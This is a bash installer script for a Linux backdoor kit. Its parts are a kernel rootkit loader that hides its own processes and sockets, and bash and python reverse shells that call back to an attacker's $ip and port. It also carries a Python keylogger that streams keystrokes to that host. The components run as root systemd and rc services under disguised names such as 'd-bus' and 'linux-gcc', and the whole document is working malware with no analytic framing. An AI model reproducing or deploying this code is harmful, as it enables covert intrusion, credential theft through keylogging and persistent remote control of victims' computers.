#!/bin/bash

#---------------------------------------------------usb-bus (/var/lib/usb-bus/usb-bus)--------------------------------------------------------
#that's the script that is gonna insert the usb-bus rootkit module at boot, hide the systemd services and the bash processes
usb_bus_script=$(cat << \EOF
#!/bin/bash

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko

while true; do
  #-hide usb-bus, d-bus and linux-gcc, which are the scripts that the systemd services execute-
  #find all the bash and python processes
  process_pids=$(ps aux | awk '{ if($11 ~ /bash/ || $11 ~ /.*python.*/) print $2 }')
  read -a process_array <<<$process_pids
  #hide the services
  for i in ${process_array[@]}; do
    cmd=$(cat /proc/$i/cmdline 2>/dev/null)
    if [ "$?" == "1" ]; then
      continue
    fi
    if [ "$cmd" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmd" == "/bin/bash/usr/local/share/d-bus/d-bus" ] || [ "$cmd" == "/usr/bin/python/usr/lib/linux-gcc/linux-gcc" ]; then
      kill -31 $i
    fi
  done

  #-hide bash shells (and the keylogger service?) which our systemd service spawns-
  #find all the pids
  pids=$(ps aux | awk '{print $2}')
  read -a pid_array <<<$pids

  #find all the inodes
  inodes=$(cat /proc/net/tcp | awk '{ if($3 ~ /0202000A:.*/) print $10 }')
  read -a inode_array <<<$inodes

  #hide the bash shells (and the keylogger service?)
  for p in ${pid_array[@]}; do
    for i in ${inode_array[@]}; do
      for (( j=0; j <= 2; j=j+1 )); do
        socket=$(readlink /proc/$p/fd/$j)
        if [ "socket:[$i]" == "$socket" ]; then
          kill -31 $p
        fi
      done
    done
  done

  sleep 1

done
EOF
)

#usb-bus systemd service
usb_bus_systemd_service=$(cat << \EOF
[Unit]
After=multi-user.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/var/lib/usb-bus/usb-bus
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
)

#-----------------------------------------d-bus (/usr/local/share/d-bus/d-bus)------------------------------------------------------------
#that's the script that's gonna open the bash connections
d_bus_bash_script=$(cat << EOF
#!/bin/bash

while true; do
  bash &>/dev/tcp/$ip/$port2 <&1 &
  sleep 300
done
EOF
)

#that's the script that's gonna open the python connections
d_bus_python_script=$(cat << EOF
#!/bin/bash

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

while true; do
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port2));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash"]);'
  sleep 60
done
EOF
)

#d-bus systemd service
d_bus_systemd_service=$(cat << \EOF
[Unit]
After=multi-user.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/usr/local/share/d-bus/d-bus
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
)

#-----------------------------------------linux-gcc (/usr/lib/linux-gcc/linux-gcc)------------------------------------------------------------
#that's the script that's gonna send keys pressed
linux_gcc_script=$(cat << EOF
#!/usr/bin/python

import struct,subprocess,sys,socket,time

keys = { 'a' : 30, 'b' : 48, 'c' : 46, 'd' : 32, 'e' : 18, 'f' : 33, 'g' : 34, 'h' : 35, 'i' : 23, 'j' : 36, 'k' : 37, 'l' : 38, 'm' : 50,
         'n' : 49, 'o' : 24, 'p' : 25, 'q' : 16, 'r' : 19, 's' : 31, 't' : 20, 'u' : 22, 'v' : 47, 'w' : 17, 'x' : 45, 'y' : 21, 'z' : 44,
'0' : 11, '1' : 2, '2' : 3, '3' : 4, '4' : 5, '5' : 6, '6' : 7, '7' : 8, '8' : 9, '9' : 10,
'space' : 57, 'left_shift' : 42, 'caps_lock' : 58, 'left_alt' : 56 }

#find the keyboard
devices = subprocess.check_output('ls /dev/input/by-path', shell=True)
devices = devices.split("\\\\n")
for i in range(0,20): #run this 20 times so we remove all mouse devices
  for item in devices:
    if item == "" or 'mouse' in item:
      devices.remove(item)
path = [None] * 10
for i in range(0, len(devices)):
  path[i] =  subprocess.check_output('realpath /dev/input/by-path/' + devices[i], shell=True)
for i in range(0, len(path)):
  if path[i] != None:
    path[i] = path[i].replace('\\\\n','')

file = open('/proc/bus/input/devices', "rb")
line = file.readlines()
for i in range(0, len(line)):
  if 'EV=120013' in line[i]:
    handlers = line[i-2]
handlers = handlers.split(' ')
for i in handlers:
  if 'event' in i:
    event = i
for i in path:
  if i is not None:
   if event in i:
      path = i

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('$ip', $portk))

file = open(path, "rb");
while 1:
  data = file.read(24)
  data_tuple = struct.unpack('4IHHI',data)
  if data_tuple[4] == 1 and data_tuple[6] == 1:
    for key, value in keys.items():
      if data_tuple[5] == value:
        #sys.stdout.write(key)
        s.sendto(key, ('$ip', $portk))
EOF
)

#linux-gcc systemd service (when portk is closed and reopens the service is gonna stop (broken pipe) and restart (after 60 sec) when the target presses a key)
linux_gcc_systemd_service=$(cat << \EOF
[Unit]
After=multi-user.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/usr/lib/linux-gcc/linux-gcc
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
EOF
)

#-----------------------------------------------------------------------------------------------------------------------------------------------
#-usb-bus rc service-
usb_bus_rc_service=$(cat << \EOF
#!/bin/sh

/var/lib/usb-bus/usb-bus &
exit 0
EOF
)

#-d-bus rc service-
d_bus_rc_service=$(cat << \EOF
#!/bin/sh

/usr/local/share/d-bus/d-bus &
exit 0
EOF
)
